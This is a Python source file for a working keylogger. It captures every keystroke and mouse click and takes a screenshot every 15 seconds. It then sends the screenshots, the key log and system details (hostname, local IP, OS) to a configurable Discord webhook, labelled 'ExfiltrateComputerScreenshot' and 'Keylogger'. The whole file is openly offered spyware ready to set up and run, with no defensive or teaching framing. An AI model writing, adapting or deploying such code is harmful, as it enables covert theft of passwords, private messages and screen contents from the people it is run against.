import pyautogui
import requests
import socket
import platform
from pynput.keyboard import Key, Listener as KeyboardListener
from pynput.mouse import Listener as MouseListener
import time

# Constants
KEYS_INFORMATION_FILE = "key_log.txt"
SCREENSHOT_INTERVAL_SECONDS = 15
RUN_TIME_SECONDS = 180 #CHANGE THIS
DISCORD_WEBHOOK_URL = "CHANGE_ME" #CHANGE THIS
RUN_TIME_MINUTES = RUN_TIME_SECONDS / 60

# Global variables
keys_pressed = []
mouse_clicks = []
start_time = time.time()
word_count = 0
click_count = 0
count = 0

def get_ip_address():
    """Retrieve the local IP address of the primary network interface."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(("8.8.8.8", 80))
            return s.getsockname()[0]
    except Exception:
        return '127.0.0.1'

def get_system_info():
    """Gather system information like hostname and operating system."""
    hostname = socket.gethostname()
    local_ip = get_ip_address()
    operating_system = platform.system() + " " + platform.release()
    return hostname, local_ip, operating_system

def on_key_press(key):
    global keys_pressed, word_count

    keys_pressed.append((key, time.time()))
    if key == Key.space:
        word_count += 1
    write_data_to_file()

def on_mouse_click(x, y, button, pressed):
    global click_count
    if pressed:
        click_count += 1
        mouse_clicks.append((x, y, button, time.time()))
        write_data_to_file()

def write_data_to_file():
    """Write the captured keys and mouse clicks to a file."""
    with open(KEYS_INFORMATION_FILE, "a") as file:
        for item in keys_pressed + mouse_clicks:
            if isinstance(item, tuple) and len(item) == 4:  # Mouse click data
                x, y, button, click_time = item
                file.write(f"Mouse Click: X={x}, Y={y}, Button={button}, Time={click_time - start_time:.2f}\n")
            elif isinstance(item, tuple) and len(item) == 2:  # Key press data
                key, key_time = item
                key_str = str(key).replace("'", "")
                if key_str.find("space") > 0:
                    file.write('\n')
                elif key_str.find("Key") == -1:
                    file.write(key_str)

        keys_pressed.clear()
        mouse_clicks.clear()

def take_and_send_screenshot():
    """Take a screenshot and send it to Discord."""
    screenshot_filename = f"screenshot_{int(time.time() - start_time)}.png"
    screenshot = pyautogui.screenshot()
    screenshot.save(screenshot_filename)

    time.sleep(1)  # Ensure file is saved

    try:
        with open(screenshot_filename, "rb") as f:
            photo = f.read()
        hostname, local_ip, operating_system = get_system_info()
        current_timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
        request_data = {
            "username": "ExfiltrateComputerScreenshot",
            "content": f"Hostname: {hostname}\nLocal IP: {local_ip}\nOperating System: {operating_system}\nTimestamp: {current_timestamp}"
        }
        response = requests.post(DISCORD_WEBHOOK_URL, data=request_data, files={"screenshot.png": photo})
        if response.status_code != 200:
            print(f"Error while sending screenshot to Discord: {response.status_code}")
    except FileNotFoundError:
        print(f"Failed to open the screenshot file: {screenshot_filename}")
def send_keylog_with_stats():
    global end_time
    end_time = time.time()

    # Calculate CPM and WPM
    clicks_per_minute = click_count / RUN_TIME_MINUTES
    words_per_minute = word_count / RUN_TIME_MINUTES

    with open(KEYS_INFORMATION_FILE, "rb") as f:
        keylog = f.read()

    hostname, local_ip, operating_system = get_system_info()
    start_timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(start_time))
    end_timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(end_time))

    request_data = {
        "username": "Keylogger",
        "content": (
            f"Hostname: {hostname}\nLocal IP: {local_ip}\nOperating System: {operating_system}\n"
            f"Start Timestamp: {start_timestamp}\nEnd Timestamp: {end_timestamp}\n"
            f"Clicks Per Minute: {clicks_per_minute:.2f}\nWords Per Minute: {words_per_minute:.2f}\nKey Log"
        )
    }
    response = requests.post(DISCORD_WEBHOOK_URL, data=request_data, files={"key_log.txt": keylog})
    if response.status_code != 200:
        print(f"Error while sending key log to Discord: {response.status_code}")

def main():
    print(f"Recording mouse clicks, keyboard input, and taking screenshots for {RUN_TIME_MINUTES:.1f} minutes...")

    with KeyboardListener(on_press=on_key_press) as key_listener, MouseListener(on_click=on_mouse_click) as mouse_listener:
        try:
            while time.time() < start_time + RUN_TIME_SECONDS:
                if int(time.time() - start_time) % SCREENSHOT_INTERVAL_SECONDS == 0:
                    take_and_send_screenshot()
        except KeyboardInterrupt:
            pass

    send_keylog_with_stats()

    print("Recording completed.")

if __name__ == "__main__":
    main()

    # one two three four five six seven eight nine ten eleven twelve